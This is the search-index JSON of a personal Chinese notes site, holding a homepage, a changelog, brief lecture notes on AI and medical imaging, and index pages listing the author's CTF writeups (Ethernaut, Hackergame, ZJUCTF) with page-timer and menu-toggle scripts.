{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f \u00b6 \u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a21 \u603b\u5b57\u6570\uff1a7021 \u4ee3\u7801\u5757\u884c\u6570\uff1a923 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"#_1","text":"\u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a21 \u603b\u5b57\u6570\uff1a7021 \u4ee3\u7801\u5757\u884c\u6570\uff1a923 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"changelog/","text":"\u66f4\u65b0\u8bb0\u5f55 \u00b6 Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u6539\u52a8\u8bb0\u5f55 PS\uff1a\u8fd9\u4e2a\u529f\u80fd\u7528\u7684\u662fTony\u4f6c\u7684\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; } 2023 \u00b6 2023-10-26 \u00b6 ZJUCTF 2023 Writeup 2023-10-25 \u00b6 \u4f7f\u7528TonyCrane Toolchain\u5b8c\u6210\u4e86\u521d\u6b65note\u7684\u90e8\u7f72","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#_1","text":"Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u6539\u52a8\u8bb0\u5f55 PS\uff1a\u8fd9\u4e2a\u529f\u80fd\u7528\u7684\u662fTony\u4f6c\u7684\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; }","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#2023","text":"2023-10-26 \u00b6 ZJUCTF 2023 Writeup 2023-10-25 \u00b6 \u4f7f\u7528TonyCrane Toolchain\u5b8c\u6210\u4e86\u521d\u6b65note\u7684\u90e8\u7f72","title":"2023"},{"location":"links/","text":"\u53cb\u94fe \u00b6 Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"links/#_1","text":"Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"todo/","text":"note\u8ba1\u5212 \u00b6 \u7ea6 28 \u4e2a\u5b57 \u5efa\u7ad9\u76f8\u5173 \u00b6 [] \u4f7f\u7528TonyCrane-toolchain\u642d\u5efa [] \u6839\u636e\u81ea\u5df1\u9700\u6c42\u505a\u51fa\u81ea\u5b9a\u4e49 \u7b14\u8bb0\u76f8\u5173 \u00b6 [] loading...","title":"ToDo"},{"location":"todo/#note","text":"\u7ea6 28 \u4e2a\u5b57","title":"note\u8ba1\u5212"},{"location":"todo/#_1","text":"[] \u4f7f\u7528TonyCrane-toolchain\u642d\u5efa [] \u6839\u636e\u81ea\u5df1\u9700\u6c42\u505a\u51fa\u81ea\u5b9a\u4e49","title":"\u5efa\u7ad9\u76f8\u5173"},{"location":"todo/#_2","text":"[] loading...","title":"\u7b14\u8bb0\u76f8\u5173"},{"location":"ai/","text":"Artificial Intelligence \u00b6 \u7ea6 21 \u4e2a\u5b57 Abtract AI \u76f8\u5173 Courses AI & Medical Image 343 1 mins 1730258309 Other Pytorch 20 0 mins 1699268877 Tensorflow 20 0 mins 1699268877 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Artificial Intelligence"},{"location":"ai/#artificial-intelligence","text":"\u7ea6 21 \u4e2a\u5b57 Abtract AI \u76f8\u5173 Courses AI & Medical Image 343 1 mins 1730258309 Other Pytorch 20 0 mins 1699268877 Tensorflow 20 0 mins 1699268877 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Artificial Intelligence"},{"location":"ai/pytorch/","text":"Pytorch \u00b6 \u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bPytorch\u6846\u67b6\u7684\u57fa\u7840","title":"PyTorch"},{"location":"ai/pytorch/#pytorch","text":"\u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bPytorch\u6846\u67b6\u7684\u57fa\u7840","title":"Pytorch"},{"location":"ai/tensorflow/","text":"Tensorflow \u00b6 \u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bTensorflow\u6846\u67b6\u7684\u57fa\u7840","title":"Tensorflow"},{"location":"ai/tensorflow/#tensorflow","text":"\u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bTensorflow\u6846\u67b6\u7684\u57fa\u7840","title":"Tensorflow"},{"location":"ai/courses/","text":"Courses \u00b6","title":"Courses"},{"location":"ai/courses/#courses","text":"","title":"Courses"},{"location":"ai/courses/ai_med/","text":"\u4eba\u5de5\u667a\u80fd\u4e0e\u533b\u5b66\u56fe\u50cf\u5206\u6790 \u00b6 \u7ea6 339 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f Abstract A HARDCORE(FAKE) course of Dr.Zhao. Lesson 1 \u00b6 \u4e34\u5e8a\u95ee\u9898 \u00b6 \u4e3b\u8981\u4efb\u52a1\u5206\u7c7b\uff1a \u8bca\u65ad \u5b9a\u4f4d \u5206\u5272 \u751f\u6210 \u9884\u6d4b \u4eba\u5de5\u667a\u80fd \u00b6 \u5982\u4f55\u8bc4\u5224\u4e00\u5f20\u533b\u5b66\u56fe\u50cf\u7684\u597d\u574f \u91d1\u6807\u51c6 \uff1a\u533b\u751f\u4e3b\u89c2\u5224\u65ad \u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\uff08\u91cf\u5316\u6307\u6807\uff09\uff1a \u8fb9\u7f18\u6e05\u6670 \u5bf9\u6bd4\u5ea6\u9ad8 \u4fe1\u566a\u6bd4\u9ad8 \u6ca1\u6709\u8fd0\u52a8\u4f2a\u5f71 ... \u673a\u5668\u5b66\u4e60\u672c\u8d28\u662f\u5f52\u7eb3 \u6837\u672c\u5206\u5e03 \u53ef\u89e3\u91ca\u6027\uff1a\u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\u4e0e\u4eba\u5de5\u667a\u80fd\u7684\u533a\u522b \uff08\u8fd1\u51e0\u5e74\u6709\u5927\u91cf\u7684\u7814\u7a76\u6539\u5584\uff09 \u4ece\u4f4e\u7ef4\u5230\u9ad8\u7ef4\u7279\u5f81 \u00b6 \u4e3a\u4ec0\u4e48\u8981\u9ad8\u7ef4\u7279\u5f81 \u5c06\u975e\u7ebf\u6027\u95ee\u9898\u8f6c\u6362\u6210\u7ebf\u6027\u95ee\u9898\uff08\u7b80\u5355\u95ee\u9898\uff09 AI History (\u53ef\u7565\u8fc7) AI History \u00b6 \u8d1d\u53f6\u65af\u4f30\u8ba1 \u00b6 \u5148\u9a8c\u77e5\u8bc6\u5bf9\u7ed3\u679c\u5f71\u54cd\u5f88\u5927\uff08\u4e00\u4e2a\u4f8b\u5b50\uff09 $$ P(A|B) = \\frac{P(B|A)P(A)}{P(B)} $$ \u9a6c\u5c14\u53ef\u592b\u94fe \u00b6 \u7565 Neuron/Perception \u00b6 \u795e\u7ecf\u5143\u6a21\u578b\uff0c\u7565 $$ Y=A(Wx+b) $$ Alan Turing \u00b6 \u4fe1\u606f\u8bba initial seed\u7684\u91cd\u8981\u6027 Nearest Neighbor search \u00b6 \u805a\u7c7b\u548c\u5206\u7c7b\u95ee\u9898 K-Means SVM \u67d0\u4e9b\u4efb\u52a1\u91cc\uff0c\u4f20\u7edf\u7684\u673a\u5668\u5b66\u4e60\u4e5f\u4f1a\u4f18\u4e8e\u6df1\u5ea6\u5b66\u4e60 Multiple Layer Perception \u00b6 Forward Backward AI Winter \u00b6 \u7565 RNN \u00b6 \u7565 LeNeT \u00b6 1998 Convolution Neural Network LSTM \u00b6 \u7565 AlexNet \u00b6 ImgaeNet by LeeFeifei\uff0c\u7565 GAN \u00b6 2014 lan Goodfellow Transformer \u00b6 2017 Google Brain Attention Is All You Need Diffusion \u00b6 \u7565 Linear Algorithm \u00b6 \\[ Y=EX \\] Y is given If E is given, X is the target: image reconstruction If X is given, E is the target: machine learning Inner product \u00b6 \u5185\u79ef\u7684\u610f\u4e49\uff1a\u6295\u5f71 $$ x\u00b7y=|x||y|cos\\theta $$","title":"AI & Medical Image"},{"location":"ai/courses/ai_med/#_1","text":"\u7ea6 339 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f Abstract A HARDCORE(FAKE) course of Dr.Zhao.","title":"\u4eba\u5de5\u667a\u80fd\u4e0e\u533b\u5b66\u56fe\u50cf\u5206\u6790"},{"location":"ai/courses/ai_med/#lesson-1","text":"","title":"Lesson 1"},{"location":"ai/courses/ai_med/#_2","text":"\u4e3b\u8981\u4efb\u52a1\u5206\u7c7b\uff1a \u8bca\u65ad \u5b9a\u4f4d \u5206\u5272 \u751f\u6210 \u9884\u6d4b","title":"\u4e34\u5e8a\u95ee\u9898"},{"location":"ai/courses/ai_med/#_3","text":"\u5982\u4f55\u8bc4\u5224\u4e00\u5f20\u533b\u5b66\u56fe\u50cf\u7684\u597d\u574f \u91d1\u6807\u51c6 \uff1a\u533b\u751f\u4e3b\u89c2\u5224\u65ad \u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\uff08\u91cf\u5316\u6307\u6807\uff09\uff1a \u8fb9\u7f18\u6e05\u6670 \u5bf9\u6bd4\u5ea6\u9ad8 \u4fe1\u566a\u6bd4\u9ad8 \u6ca1\u6709\u8fd0\u52a8\u4f2a\u5f71 ... \u673a\u5668\u5b66\u4e60\u672c\u8d28\u662f\u5f52\u7eb3 \u6837\u672c\u5206\u5e03 \u53ef\u89e3\u91ca\u6027\uff1a\u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\u4e0e\u4eba\u5de5\u667a\u80fd\u7684\u533a\u522b \uff08\u8fd1\u51e0\u5e74\u6709\u5927\u91cf\u7684\u7814\u7a76\u6539\u5584\uff09","title":"\u4eba\u5de5\u667a\u80fd"},{"location":"ai/courses/ai_med/#_4","text":"\u4e3a\u4ec0\u4e48\u8981\u9ad8\u7ef4\u7279\u5f81 \u5c06\u975e\u7ebf\u6027\u95ee\u9898\u8f6c\u6362\u6210\u7ebf\u6027\u95ee\u9898\uff08\u7b80\u5355\u95ee\u9898\uff09 AI History (\u53ef\u7565\u8fc7)","title":"\u4ece\u4f4e\u7ef4\u5230\u9ad8\u7ef4\u7279\u5f81"},{"location":"ai/courses/ai_med/#ai-history","text":"","title":"AI History"},{"location":"ai/courses/ai_med/#_5","text":"\u5148\u9a8c\u77e5\u8bc6\u5bf9\u7ed3\u679c\u5f71\u54cd\u5f88\u5927\uff08\u4e00\u4e2a\u4f8b\u5b50\uff09 $$ P(A|B) = \\frac{P(B|A)P(A)}{P(B)} $$","title":"\u8d1d\u53f6\u65af\u4f30\u8ba1"},{"location":"ai/courses/ai_med/#_6","text":"\u7565","title":"\u9a6c\u5c14\u53ef\u592b\u94fe"},{"location":"ai/courses/ai_med/#neuronperception","text":"\u795e\u7ecf\u5143\u6a21\u578b\uff0c\u7565 $$ Y=A(Wx+b) $$","title":"Neuron/Perception"},{"location":"ai/courses/ai_med/#alan-turing","text":"\u4fe1\u606f\u8bba initial seed\u7684\u91cd\u8981\u6027","title":"Alan Turing"},{"location":"ai/courses/ai_med/#nearest-neighbor-search","text":"\u805a\u7c7b\u548c\u5206\u7c7b\u95ee\u9898 K-Means SVM \u67d0\u4e9b\u4efb\u52a1\u91cc\uff0c\u4f20\u7edf\u7684\u673a\u5668\u5b66\u4e60\u4e5f\u4f1a\u4f18\u4e8e\u6df1\u5ea6\u5b66\u4e60","title":"Nearest Neighbor search"},{"location":"ai/courses/ai_med/#multiple-layer-perception","text":"Forward Backward","title":"Multiple Layer Perception"},{"location":"ai/courses/ai_med/#ai-winter","text":"\u7565","title":"AI Winter"},{"location":"ai/courses/ai_med/#rnn","text":"\u7565","title":"RNN"},{"location":"ai/courses/ai_med/#lenet","text":"1998 Convolution Neural Network","title":"LeNeT"},{"location":"ai/courses/ai_med/#lstm","text":"\u7565","title":"LSTM"},{"location":"ai/courses/ai_med/#alexnet","text":"ImgaeNet by LeeFeifei\uff0c\u7565","title":"AlexNet"},{"location":"ai/courses/ai_med/#gan","text":"2014 lan Goodfellow","title":"GAN"},{"location":"ai/courses/ai_med/#transformer","text":"2017 Google Brain Attention Is All You Need","title":"Transformer"},{"location":"ai/courses/ai_med/#diffusion","text":"\u7565","title":"Diffusion"},{"location":"ai/courses/ai_med/#linear-algorithm","text":"\\[ Y=EX \\] Y is given If E is given, X is the target: image reconstruction If X is given, E is the target: machine learning","title":"Linear Algorithm"},{"location":"ai/courses/ai_med/#inner-product","text":"\u5185\u79ef\u7684\u610f\u4e49\uff1a\u6295\u5f71 $$ x\u00b7y=|x||y|cos\\theta $$","title":"Inner product"},{"location":"cs/","text":"","title":"Index"},{"location":"ctf/","text":"CTF \u00b6 Abstract CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002 Table of Contents \u00b6 misc Steganography \u9690\u5199\u672f 0 0 mins 0 Web todo 0 0 mins 1698334667 Others Writeups 6321 923 32 mins 1739892671 Tools 1 0 mins 1698334667 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"CTF"},{"location":"ctf/#ctf","text":"Abstract CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002","title":"CTF"},{"location":"ctf/#table-of-contents","text":"misc Steganography \u9690\u5199\u672f 0 0 mins 0 Web todo 0 0 mins 1698334667 Others Writeups 6321 923 32 mins 1739892671 Tools 1 0 mins 1698334667 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"ctf/misc/","text":"","title":"Index"},{"location":"ctf/tools/","text":"Tools \u00b6","title":"Tools"},{"location":"ctf/tools/#tools","text":"","title":"Tools"},{"location":"ctf/web/","text":"","title":"Index"},{"location":"ctf/writeups/","text":"Writeups \u00b6 Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup Table of Contents \u00b6 Learning Ethernaut 942 402 8 mins 1699852967 2023 \ud83d\udd12 ZJUCTF 2023 1090 4 mins \u4e0d\u516c\u5f00 Hackergame 2023 3147 222 13 mins 1699161500 2024 Hackergame 2024 15 0 mins 1739892672 \ud83d\udd12 ZJUCTF 2024 1083 299 7 mins \u4e0d\u516c\u5f00 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Writeups"},{"location":"ctf/writeups/#writeups","text":"Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup","title":"Writeups"},{"location":"ctf/writeups/#table-of-contents","text":"Learning Ethernaut 942 402 8 mins 1699852967 2023 \ud83d\udd12 ZJUCTF 2023 1090 4 mins \u4e0d\u516c\u5f00 Hackergame 2023 3147 222 13 mins 1699161500 2024 Hackergame 2024 15 0 mins 1739892672 \ud83d\udd12 ZJUCTF 2024 1083 299 7 mins \u4e0d\u516c\u5f00 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"ctf/writeups/ethernaut/","text":"Ethernaut \u00b6 \u7ea6 938 \u4e2a\u5b57 402 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 